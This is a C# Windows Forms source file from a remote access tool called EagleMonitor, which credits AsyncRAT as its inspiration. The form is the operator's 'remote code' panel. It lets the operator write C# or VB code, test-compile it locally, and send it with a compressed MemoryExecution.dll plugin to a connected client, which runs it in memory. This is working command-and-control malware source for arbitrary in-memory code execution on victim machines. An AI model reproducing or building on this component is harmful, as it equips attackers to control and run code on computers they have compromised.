using EagleMonitor.Controls;
using EagleMonitor.Networking;
using FastColoredTextBoxNS;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using PacketLib;
using PacketLib.Packet;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Plugin/RemoteCamera/RemoteCamera/Packet.cs
*/

namespace EagleMonitor
{
    public partial class RemoteCodeForm : FormPattern
    {
        private ClientHandler clientHandler { get; set; }
        internal RemoteCodeForm(ClientHandler clientHandler)
        {
            this.clientHandler = clientHandler;
            InitializeComponent();
        }

        private void RemoteCodeForm_Load(object sender, EventArgs e)
        {
            RowAdder("System.dll");
            RowAdder("Microsoft.VisualBasic.dll");
            RowAdder("System.Windows.Forms.dll");
            RowAdder("System.Management.dll");
            RowAdder("System.Drawing.dll");
        }

        private void languageComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (languageComboBox.SelectedIndex == 0)
            {
                codeTextBox.Language = Language.CSharp;
                codeTextBox.Text = codeTextBox.Text = GetCode(Language.CSharp);
            }
            else
            {
                codeTextBox.Language = Language.VB;
                codeTextBox.Text = GetCode(Language.VB);
            }
        }

        private void testGuna2Button_Click(object sender, EventArgs e)
        {
            List<string> reference = new List<string>();
            foreach (DataGridViewRow row in dataGridView1.Rows)
            {
                reference.Add(row.Cells["Column1"].Value.ToString());
            }

            switch (languageComboBox.Text)
            {
                case "C#":
                    {
                        TryLocally(new CSharpCodeProvider(new Dictionary<string, string>() {
                {"CompilerVersion", "v4.0" } }), codeTextBox.Text, string.Join(",", reference).Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                        break;
                    }

                case "VB":
                    {
                        TryLocally(new VBCodeProvider(new Dictionary<string, string>() {
                {"CompilerVersion", "v4.0" } }), codeTextBox.Text, string.Join(",", reference).Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                        break;
                    }
            }
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string newReference =Interaction.InputBox("Add reference");
            if (!newReference.EndsWith(".dll"))
                newReference += ".dll";
            RowAdder(newReference);
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow row in dataGridView1.SelectedRows)
            {
                dataGridView1.Rows.RemoveAt(row.Index);
            }
        }

        private void sendGuna2Button_Click(object sender, EventArgs e)
        {
            RemoteCodeExecution remoteCodeExecution = null;

            List<string> reference = new List<string>();
            foreach (DataGridViewRow row in dataGridView1.Rows)
            {
                reference.Add(row.Cells["Column1"].Value.ToString());
            }

            switch (languageComboBox.Text)
            {
                case "C#":
                    remoteCodeExecution = new RemoteCodeExecution
                        (
                        PacketType.MEM_EXEC_CSHARP_CODE, 
                        $"/target:winexe /platform:{platformGuna2ComboBox.Text} /optimize- /unsafe",
                        codeTextBox.Text,
                        reference
                        );
                    break;
         

                case "VB":
                    remoteCodeExecution = new RemoteCodeExecution(
                        PacketType.MEM_EXEC_VB_CODE,
                         $"/target:winexe /platform:{platformGuna2ComboBox.Text} /optimize- /unsafe",
                         codeTextBox.Text,
                         reference
                        );
                    break;
                  
            }

            if(remoteCodeExecution != null)
                remoteCodeExecution.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\MemoryExecution.dll"), 1);

            this.clientHandler.SendPacket(remoteCodeExecution);
        }

        private void RowAdder(string lib) 
        {
            int rowId = this.dataGridView1.Rows.Add();
            DataGridViewRow row = this.dataGridView1.Rows[rowId];
            row.Cells["Column1"].Value = lib;
        }

        private string GetCode(Language currentLanguage)
        {
            switch (currentLanguage)
            {
                case Language.VB:
                    {
                        return @"Imports System
Imports System.Windows.Forms

Namespace EagleMonitor
    Public Class Program
        Public Shared Sub Main()
            Try
                MessageBox.Show(""Hello World"")
            Catch
            End Try
        End Sub
    End Class
End Namespace

";
                    }
                    case Language.CSharp:
                        return @"using System;
using System.Windows.Forms;
namespace EagleMonitor
{
    public class Program
    {
        public static void Main()
        {
            try
            {
                MessageBox.Show(""Hello World"");
            }
            catch { }
        }
    }
}";
                default:
                    return "";
            }
        }

        private void TryLocally(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
        {
            try
            {
                var compilerOptions = $"/target:winexe /platform:{platformGuna2ComboBox.Text} /optimize- /unsafe";

                var compilerParameters = new CompilerParameters(referencedAssemblies)
                {
                    GenerateExecutable = true,
                    GenerateInMemory = true,
                    CompilerOptions = compilerOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false,
                };
                var compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, source);

                if (compilerResults.Errors.Count > 0)
                {
                    foreach (CompilerError compilerError in compilerResults.Errors)
                    {
                        MessageBox.Show(string.Format("{0}\nLine: {1}", compilerError.ErrorText, compilerError.Line), "Code", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        break;
                    }
                }
                else
                {
                    compilerResults = null;
                    MessageBox.Show("Code working !", "Working", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label3_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
